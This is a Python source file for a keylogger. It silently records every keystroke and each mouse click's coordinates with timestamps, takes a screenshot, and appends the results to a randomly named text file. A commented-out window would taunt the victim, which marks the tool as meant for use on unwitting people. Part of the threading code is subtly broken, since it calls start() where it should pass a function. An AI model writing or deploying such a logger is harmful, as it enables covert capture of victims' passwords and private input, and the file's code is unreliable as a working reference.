import sys, tkinter, keyboard, time
from threading import Thread
from datetime import datetime
from string import ascii_lowercase
from random import choices
from pynput import mouse
from pyautogui import screenshot
#C:\Users\alessandro.030108\AppData\Local\Programs\Python\Python311


log_name = "".join(choices(ascii_lowercase, k=5))

def create_window(title, dimensions, text):
    new_window = tkinter.Tk(className=f"{title}")
    window_text_def = tkinter.Text(new_window, wrap="word", font=('Courier 15 bold'), bg="black", fg="limegreen")
    new_window.geometry(f"{dimensions}")
    window_text_def.insert(tkinter.END, f"{text}")
    window_text_def.place(x=10, y= 10, width= 475, height= 175)
    tkinter.mainloop()

class get_keyboard_input:
    def __init__(self):
        self.log = ""
        self.start_time = datetime.now()

    def format_input(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "

            elif name == "enter":
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."

            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
        self.write_to_file(f"{datetime.now()} - {name}")


    def write_to_file(self, input):
        if len(input) >= 1:
            write_file(input, log_name)

        self.log = ""

    def start(self):
        self.start_time = datetime.now()

        write_file(f"{datetime.now()} - Started logging", log_name)

        keyboard.on_release(callback=self.format_input)
        keyboard.wait()

def get_mouse_input(x, y, button, pressed):
    global pressed_location
    global released_location
    if pressed:
        pressed_location = x, y
    else:
        released_location = x, y
        write_file(f"{datetime.now()} - Mouse pressed at X:{pressed_location[0]} Y:{pressed_location[1]} and released at X:{released_location[0]} Y:{released_location[1]}", log_name)

def get_printscreen():
    starttime = time.time()
    screen_log = screenshot()
    screen_log.save(f"./{datetime.now().date()}.png")

def write_file(input, filename):
    with open(f'{filename}.txt', 'a') as f:
        f.write(input+"\n")

if __name__ == "__main__":
    #create_window("You fucked up good bro...", "500x200", "\n              ..----.._    _\n            .' .--.    '-.(O)_\n'-.__.-'''=:|  ,  _)_ \__ . c\'-..\n             ''------'---''---'-'\n")

    get_printscreen()

    click_logger = mouse.Listener(on_click=get_mouse_input)
    clicklogger_thread = Thread(target=click_logger.start())
    keylogger = get_keyboard_input()
    keylogger_thread = Thread(target=keylogger.start())

    clicklogger_thread.start()
    keylogger_thread.start()
    clicklogger_thread.join()
    keylogger_thread.join()
    


